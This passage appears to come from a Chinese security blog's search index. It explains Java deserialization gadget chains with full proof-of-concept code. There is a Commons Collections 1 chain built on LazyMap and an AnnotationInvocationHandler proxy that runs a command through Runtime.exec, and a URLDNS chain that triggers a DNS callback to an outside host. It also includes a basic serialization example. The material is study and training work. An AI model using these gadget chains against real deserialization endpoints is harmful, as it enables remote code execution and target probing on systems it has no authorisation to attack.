另一条在上面选择任意类执行transform方法的时候，选择了TransformedMap 这次选择另一个类LazyMap中的get()方法 再看一下哪里调用了get()方法，恰好在AnnotationInocationHandler类中的invoke()方法中调用了get()方法 而恰好memberValues也是可控的，那如何调用到invoke()方法呢？ 这里需要一个新的知识点，动态代理，将AnnoationInvocationHandler动态代理，执行任意方法，即可调用到invoke方法，但是根据 invoke 中的if条件，执行的任意方法必须是无参的，恰好在AnnotationInvocationHandler类中的readObject()方法中，有这样的方法存在 于是根据上面的poc修改一下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":"世界上最简单的 java 链 先来看一下如何序列化/反序列化 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user.setName(\"xiaoming\"); //序列化输出 ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(user); System.out.println(); // 序列化写入文件 FileOutputStream file = new FileOutputStream(\"test.bin\"); ObjectOutputStream fout = new ObjectOutputStream(file); fout.writeObject(user); // 序列化写入到变量中 ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream jout = new ObjectOutputStream(bout); jout.writeObject(user); byte[] str = bout.toByteArray(); System.out.println(new String(str)); // 从变量中反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); user user_d = (user) ois.readObject(); System.out.println(user_d.getName()); } } class user implements Serializable{ private String name; public user() { } public void setName(String name) { this.name = name; } public String getName() { return name; } } URLDNS链详解","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 原理java.util.HashMap重写了readObject方法，在反序列化时调用hash函数计算 key 的 hashCode，而java.net.URL的 hashCode 在计算时会调用getHostAddress来解析域名，从而发出 DNS 请求 由HashMap 类readObject引起， private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { reinitialize(); ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\"loadFactor\", 0.75f); if (lf \u003c= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\"Illegal load factor: \" + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u003c 0) { throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u003e 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u003c DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u003e= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u003c MAXIMUM_CAPACITY \u0026\u0026 ft \u003c MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\"rawtypes\",\"unchecked\"}) Node\u003cK,V\u003e[] tab = (Node\u003cK,V\u003e[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 在HashMap的键名计算了 hash， putVal(hash(key), key, value, false, false); 跟进查看一下 调用了key.hashCode()，而这里的 key 是可控的，就是传入的java.net.URL，跟进查看一下 这里hashCode==-1，重新进行hashCode()方法计算，跟进handler查看调用了哪一个hashCode() transient关键字，修饰 Java 序列化对象时，不需要序列化属性也就是handler属性不参与序列化，直接跟进URLStreamHandler查看一下 这里调用了getHostAddress跟进查看一下 又调用了java.net.URL的getHostAddress方法 继续跟进 进入到InetAddress.getByName(host);便会触发DNS请求 继续回到readObject()中，看看如何给key赋值 key是从K key = (K) s.readObject();这串代码，也就是readObject中得到的，说明之前是writeObject会写入 key HashMap#writeObject 进入了internalWriteEntries()跟进查看 这里的key以及value是从 tab 中取的，而 tab 的值即HashMap中 table 的值。 想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以这里也会产生一次dns查询 为了避免这次 dns 查询，我们将hashCode设置不为-1的其他值 构造完整poc package org.example; import java.io.*; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { HashMap hashmap = new HashMap(); URL url = new URL(\"http://47894df839.ipv6.1433.eu.org\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,1); hashmap.put(url,1); f.set(url,-1); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashmap); byte[] str = b.toByteArray(); System.out.println(str); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); ois.readObject(); } } 调用栈如下 ","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"}]